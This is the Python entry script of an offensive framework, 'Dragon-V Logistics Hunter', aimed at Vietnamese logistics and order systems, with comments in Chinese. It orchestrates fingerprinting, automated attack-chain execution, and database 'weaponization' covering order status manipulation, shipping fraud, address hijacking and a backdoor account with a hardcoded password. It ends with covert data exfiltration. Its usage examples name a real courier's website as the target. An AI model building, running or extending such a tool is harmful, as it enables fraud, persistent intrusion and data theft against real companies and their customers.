"""
🐉 Dragon-V Logistics Hunter 主执行脚本
专为越南物流/快递/订单系统设计的业务逻辑渗透框架
"""

import asyncio
import argparse
import sys
import os
import json
import time
import logging
import aiohttp
from typing import Dict, List, Optional, Any
from pathlib import Path

# 添加项目根目录到Python路径
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.vietnamese_fingerprinter import VietnameseFingerprinter
from core.attack_chainer import AttackChainer, AttackChain
from database.deep_weaponization import DatabaseWeaponization
from exfiltration.covert_exfil import CovertExfiltration, ExfiltrationTechnique
from ai.chain_planner import ChainPlanner

# 配置日志（日誌寫入與 main.py 同目錄，避免污染工作目錄）
_log_dir = os.path.dirname(os.path.abspath(__file__))
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(_log_dir, 'dragon_v_hunter.log'), encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DragonVHunter:
    """Dragon-V Logistics Hunter 主类"""

    def __init__(self):
        self.fingerprinter = VietnameseFingerprinter()
        self.attack_chainer = AttackChainer()
        self.database_weaponizer = DatabaseWeaponization()
        self.exfiltrator = CovertExfiltration()
        self.chain_planner = ChainPlanner()
        self.logger = logging.getLogger(__name__)

    async def full_chain_penetration(self, target_url: str, config: Dict[str, Any] = None) -> Dict[str, Any]:
        """执行完整的业务逻辑渗透链"""
        start_time = time.time()
        self.logger.info(f"🐉 开始 Dragon-V 完整渗透链: {target_url}")

        results = {
            "target_url": target_url,
            "start_time": time.strftime('%Y-%m-%d %H:%M:%S'),
            "penetration_phases": [],
            "total_execution_time": None,
            "final_assessment": {}
        }

        try:
            # 第一阶段：越南化深度指纹识别
            self.logger.info("🔍 第一阶段：越南化深度指纹识别")
            phase1_start = time.time()

            async with aiohttp.ClientSession() as session:
                fingerprint_result = await self.fingerprinter.fingerprint(session, target_url)

            phase1_time = time.time() - phase1_start
            results["penetration_phases"].append({
                "phase": "指纹识别",
                "duration": phase1_time,
                "result": {
                    "technology_stack": fingerprint_result.technology_stack.value,
                    "business_type": fingerprint_result.business_type.value,
                    "confidence_score": fingerprint_result.confidence_score,
                    "vietnamese_indicators": len(fingerprint_result.vietnamese_indicators),
                    "endpoints_found": sum(len(v) for v in fingerprint_result.endpoints.values()),
                    "database_dialect": fingerprint_result.database_dialect
                }
            })

            self.logger.info(f"✅ 指纹识别完成，置信度: {fingerprint_result.confidence_score:.2%}")

            # 第二阶段：业务逻辑攻击链生成
            self.logger.info("⚡ 第二阶段：业务逻辑攻击链生成")
            phase2_start = time.time()

            attack_chain = await self.attack_chainer.generate_attack_chain(
                fingerprint_result.__dict__
            )

            phase2_time = time.time() - phase2_start
            results["penetration_phases"].append({
                "phase": "攻击链生成",
                "duration": phase2_time,
                "result": {
                    "chain_type": attack_chain.chain_type.value,
                    "chain_name": attack_chain.name,
                    "steps_count": len(attack_chain.steps),
                    "description": attack_chain.description
                }
            })

            self.logger.info(f"✅ 攻击链生成完成: {attack_chain.name}")

            # 第三阶段：攻击链执行
            self.logger.info("🎯 第三阶段：攻击链执行")
            phase3_start = time.time()

            async with aiohttp.ClientSession() as session:
                executed_chain = await self.attack_chainer.execute_attack_chain(
                    attack_chain, session
                )

            phase3_time = time.time() - phase3_start
            results["penetration_phases"].append({
                "phase": "攻击链执行",
                "duration": phase3_time,
                "result": {
                    "successful_steps": len([s for s in executed_chain.steps if s.status.value == "success"]),
                    "total_steps": len(executed_chain.steps),
                    "success_rate": len([s for s in executed_chain.steps if s.status.value == "success"]) / len(executed_chain.steps),
                    "execution_time": executed_chain.total_execution_time,
                    "extracted_data_count": len(executed_chain.extracted_data),
                    "chain_success": executed_chain.success
                }
            })

            self.logger.info(f"✅ 攻击链执行完成: {executed_chain.success}")

            # 第四阶段：数据库深度武器化
            if executed_chain.success and executed_chain.extracted_data:
                self.logger.info("💾 第四阶段：数据库深度武器化")
                phase4_start = time.time()

                # 构建武器化策略
                weaponization_strategy = [
                    {
                        "type": "ORDER_STATUS_MANIPULATION",
                        "context": {"order_ids": ["VP20241024001", "VP20241024002"]}
                    },
                    {
                        "type": "SHIPPING_FRAUD",
                        "context": {"order_ids": ["VP20241024003", "VP20241024004"]}
                    },
                    {
                        "type": "ADDRESS_HIJACKING",
                        "context": {"order_ids": ["VP20241024005"]}
                    },
                    {
                        "type": "BACKDOOR_CREATION",
                        "context": {"password": "DragonV2024!"}
                    }
                ]

                async with aiohttp.ClientSession() as session:
                    weaponization_results = await self.database_weaponizer.execute_weaponization_strategy(
                        session, target_url, weaponization_strategy
                    )

                    complete_package = await self.database_weaponizer.create_complete_weaponization_package(
                        session, target_url
                    )

                phase4_time = time.time() - phase4_start
                results["penetration_phases"].append({
                    "phase": "数据库武器化",
                    "duration": phase4_time,
                    "result": {
                        "successful_operations": len([r for r in weaponization_results if r.success]),
                        "total_operations": len(weaponization_results),
                        "total_affected_rows": sum(r.affected_rows for r in weaponization_results),
                        "persistence_success": complete_package.get("success", False),
                        "impact_analysis": complete_package.get("impact_analysis", {})
                    }
                })

                self.logger.info(f"✅ 数据库武器化完成")

            # 第五阶段：隐蔽式数据外泄
            if executed_chain.success:
                self.logger.info("🕵️ 第五阶段：隐蔽式数据外泄")
                phase5_start = time.time()

                async with aiohttp.ClientSession() as session:
                    exfil_campaign = await self.exfiltrator.execute_exfiltration_campaign(
                        session, target_url, "mock_sensitive_data"
                    )

                phase5_time = time.time() - phase5_start
                results["penetration_phases"].append({
                    "phase": "隐蔽式外泄",
                    "duration": phase5_time,
                    "result": {
                        "techniques_tested": exfil_campaign["techniques_tested"],
                        "successful_techniques": exfil_campaign["successful_techniques"],
                        "success_rate": exfil_campaign["success_rate"],
                        "total_data_sent": exfil_campaign["total_data_sent"],
                        "total_execution_time": exfil_campaign["total_execution_time"]
                    }
                })

                self.logger.info(f"✅ 数据外泄完成")

            # 最终评估
            total_execution_time = time.time() - start_time
            results["total_execution_time"] = total_execution_time
            results["final_assessment"] = self._generate_final_assessment(results)

            self.logger.info(f"🐉 Dragon-V 渗透链完成！总时间: {total_execution_time:.2f}秒")

            return results

        except Exception as e:
            self.logger.error(f"渗透链执行失败: {e}")
            return {
                "target_url": target_url,
                "error": str(e),
                "start_time": time.strftime('%Y-%m-%d %H:%M:%S'),
                "execution_failed": True
            }

    def _generate_final_assessment(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """生成最终评估报告"""
        phases = results.get("penetration_phases", [])
        successful_phases = [p for p in phases if "success" in str(p.get("result", {})).lower()]

        # 计算总体成功率
        overall_success_rate = len(successful_phases) / len(phases) if phases else 0

        # 业务影响评估
        business_impact = {
            "low": "最小影响",
            "medium": "中等影响",
            "high": "严重影响",
            "critical": "灾难性影响"
        }

        impact_level = "low"
        if overall_success_rate > 0.8:
            impact_level = "critical"
        elif overall_success_rate > 0.6:
            impact_level = "high"
        elif overall_success_rate > 0.4:
            impact_level = "medium"

        return {
            "overall_success_rate": overall_success_rate,
            "successful_phases": len(successful_phases),
            "total_phases": len(phases),
            "impact_assessment": business_impact[impact_level],
            "security_posture": "严重漏洞" if overall_success_rate > 0.6 else "中等风险",
            "recommendations": [
                "立即进行安全审计",
                "加强输入验证",
                "实施访问控制",
                "监控异常活动",
                "定期安全培训"
            ]
        }

    def save_report(self, results: Dict[str, Any], filename: str = None):
        """保存渗透报告"""
        if not filename:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"dragon_v_hunter_report_{timestamp}.html"

        try:
            report_html = self._generate_html_report(results)

            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report_html)

            self.logger.info(f"📊 渗透报告已保存: {filename}")
            return filename

        except Exception as e:
            self.logger.error(f"报告保存失败: {e}")
            return None

    def _generate_html_report(self, results: Dict[str, Any]) -> str:
        """生成HTML格式报告"""
        html_template = f"""
        <!DOCTYPE html>
        <html lang="vi">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🐉 Dragon-V Logistics Hunter 渗透报告</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
                .header {{ background: linear-gradient(135deg, #ff5722, #ff9800); color: white; padding: 20px; border-radius: 10px; }}
                .phase {{ background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .success {{ border-left: 4px solid #4caf50; }}
                .failure {{ border-left: 4px solid #f44336; }}
                .stats {{ display: flex; justify-content: space-around; margin: 20px 0; }}
                .stat-item {{ text-align: center; padding: 15px; background: white; border-radius: 8px; min-width: 150px; }}
                .stat-value {{ font-size: 24px; font-weight: bold; color: #ff5722; }}
                .stat-label {{ color: #666; margin-top: 5px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🐉 Dragon-V Logistics Hunter</h1>
                <h2>业务逻辑渗透测试报告</h2>
                <p>目标: {results.get('target_url', '未知')}</p>
                <p>时间: {results.get('start_time', '未知')}</p>
            </div>

            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value">{len(results.get('penetration_phases', []))}</div>
                    <div class="stat-label">执行阶段</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{results.get('final_assessment', {}).get('overall_success_rate', 0):.1%}</div>
                    <div class="stat-label">成功率</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{results.get('total_execution_time', 0):.1f}s</div>
                    <div class="stat-label">执行时间</div>
                </div>
            </div>

            <div class="phases">
                <h3>渗透阶段详情</h3>
                {self._generate_phases_html(results.get('penetration_phases', []))}
            </div>

            <div class="assessment">
                <h3>最终评估</h3>
                {self._generate_assessment_html(results.get('final_assessment', {}))}
            </div>

            <div class="recommendations">
                <h3>安全建议</h3>
                <ul>
                    {self._generate_recommendations_html(results.get('final_assessment', {}).get('recommendations', []))}
                </ul>
            </div>
        </body>
        </html>
        """

        return html_template

    def _generate_phases_html(self, phases: List[Dict[str, Any]]) -> str:
        """生成阶段详情HTML"""
        html = ""
        for phase in phases:
            result = phase.get('result', {})
            phase_name = phase.get('phase', '未知')
            duration = phase.get('duration', 0)

            html += f"""
            <div class="phase">
                <h4>{phase_name} (耗时: {duration:.2f}秒)</h4>
                <pre>{json.dumps(result, indent=2, ensure_ascii=False)}</pre>
            </div>
            """
        return html

    def _generate_assessment_html(self, assessment: Dict[str, Any]) -> str:
        """生成评估结果HTML"""
        html = ""
        for key, value in assessment.items():
            if key != 'recommendations':
                html += f"<p><strong>{key}:</strong> {value}</p>"
        return html

    def _generate_recommendations_html(self, recommendations: List[str]) -> str:
        """生成安全建议HTML"""
        html = ""
        for rec in recommendations:
            html += f"<li>{rec}</li>"
        return html

async def run_penetration_test(target_url: str, config: Dict[str, Any] = None) -> Dict[str, Any]:
    """运行渗透测试"""
    hunter = DragonVHunter()
    return await hunter.full_chain_penetration(target_url, config)

async def main():
    """主函数"""
    parser = argparse.ArgumentParser(
        description='🐉 Dragon-V Logistics Hunter - 专为越南物流系统设计的业务逻辑渗透框架',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python main.py -t https://viettelpost.com.vn --mode full-chain
  python main.py -t https://viettelpost.com.vn --mode fingerprint-only
  python main.py -t https://viettelpost.com.vn --mode chain-only
  python main.py -t https://viettelpost.com.vn --config dragon_v_config.json
        """
    )

    parser.add_argument('--target', '-t', type=str, required=True,
                       help='目标URL (必需)')
    parser.add_argument('--mode', '-m', type=str, choices=['full-chain', 'fingerprint-only', 'chain-only'],
                       default='full-chain', help='渗透模式')
    parser.add_argument('--config', '-c', type=str, help='配置文件路径')
    parser.add_argument('--output', '-o', type=str, help='输出报告文件名')
    parser.add_argument('--timeout', type=int, default=30, help='超时时间（秒）')
    parser.add_argument('--verbose', '-v', action='store_true', help='详细输出')

    args = parser.parse_args()

    # 设置日志级别
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # 加载配置
    config = {}
    if args.config:
        try:
            with open(args.config, 'r', encoding='utf-8') as f:
                config = json.load(f)
            logger.info(f"配置文件加载成功: {args.config}")
        except Exception as e:
            logger.warning(f"配置文件加载失败: {e}")

    logger.info(f"🐉 Dragon-V Logistics Hunter 启动...")
    logger.info(f"目标: {args.target}")
    logger.info(f"模式: {args.mode}")

    try:
        # 执行渗透测试
        if args.mode == 'full-chain':
            results = await run_penetration_test(args.target, config)
        elif args.mode == 'fingerprint-only':
            hunter = DragonVHunter()
            async with aiohttp.ClientSession() as session:
                results = await hunter.fingerprinter.fingerprint(session, args.target).__dict__
        elif args.mode == 'chain-only':
            hunter = DragonVHunter()
            async with aiohttp.ClientSession() as session:
                fingerprint_result = await hunter.fingerprinter.fingerprint(session, args.target)
                attack_chain = await hunter.attack_chainer.generate_attack_chain(fingerprint_result.__dict__)
                results = {"attack_chain": attack_chain.__dict__}
        else:
            logger.error(f"未知的渗透模式: {args.mode}")
            return

        # 输出结果
        print("\n" + "="*60)
        print("🐉 Dragon-V Logistics Hunter 结果")
        print("="*60)

        if 'total_execution_time' in results:
            print(f"总执行时间: {results['total_execution_time']:.2f}秒")
            print(f"成功率: {results.get('final_assessment', {}).get('overall_success_rate', 0):.1%}")
            print(f"安全状况: {results.get('final_assessment', {}).get('security_posture', '未知')}")

        # 保存报告
        if args.output or args.mode == 'full-chain':
            report_file = hunter.save_report(results, args.output)
            if report_file:
                print(f"报告文件: {report_file}")

        print("="*60)

    except KeyboardInterrupt:
        logger.info("用户中断执行")
    except Exception as e:
        logger.error(f"执行失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    import asyncio

    asyncio.run(main())